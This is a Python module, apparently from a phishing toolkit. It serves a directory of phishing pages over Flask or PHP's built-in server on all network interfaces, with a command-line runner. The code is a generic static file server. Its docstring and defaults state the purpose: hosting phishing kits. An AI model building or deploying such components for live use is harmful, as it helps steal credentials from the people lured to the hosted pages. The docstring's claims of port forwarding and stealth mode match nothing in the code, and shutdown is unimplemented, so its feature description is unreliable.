"""
Auto Hosting Module
Provides capability to auto-host phishing kits or decoy environments via Flask (Python) or PHP (via local server).
Supports port forwarding, live preview, and stealth mode deployment.
"""

import os
import subprocess
import threading
from flask import Flask, send_from_directory
from utils.logger import logger

class AutoHost:
    def __init__(self, method='flask', directory='outputs/phishing_pages', port=8080):
        self.method = method.lower()
        self.directory = directory
        self.port = port
        self.thread = None
        self.server = None

    def start(self):
        logger.info(f"[AUTO-HOST] Starting hosting with method: {self.method}")
        if self.method == 'flask':
            self.thread = threading.Thread(target=self._run_flask)
            self.thread.start()
        elif self.method == 'php':
            self._run_php()
        else:
            logger.error(f"[AUTO-HOST] Unsupported hosting method: {self.method}")

    def _run_flask(self):
        app = Flask(__name__, static_folder=self.directory)

        @app.route('/')
        def index():
            return send_from_directory(self.directory, 'index.html')

        @app.route('/<path:path>')
        def static_files(path):
            return send_from_directory(self.directory, path)

        logger.info(f"[AUTO-HOST] Flask server running on http://0.0.0.0:{self.port}")
        app.run(host='0.0.0.0', port=self.port)

    def _run_php(self):
        logger.info(f"[AUTO-HOST] Launching PHP server at http://0.0.0.0:{self.port}")
        try:
            subprocess.run([
                'php', '-S', f'0.0.0.0:{self.port}', '-t', self.directory
            ])
        except Exception as e:
            logger.error(f"[AUTO-HOST] Failed to start PHP server: {str(e)}")

    def stop(self):
        # Placeholder for shutdown logic (especially for Flask thread or PHP process)
        logger.info("[AUTO-HOST] Shutdown requested (not yet implemented).")

# Optional CLI Runner
if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="Auto Host a directory using Flask or PHP.")
    parser.add_argument('--method', choices=['flask', 'php'], default='flask', help='Hosting method')
    parser.add_argument('--dir', default='outputs/phishing_pages', help='Directory to serve')
    parser.add_argument('--port', type=int, default=8080, help='Port to host on')
    args = parser.parse_args()

    hoster = AutoHost(method=args.method, directory=args.dir, port=args.port)
    hoster.start()
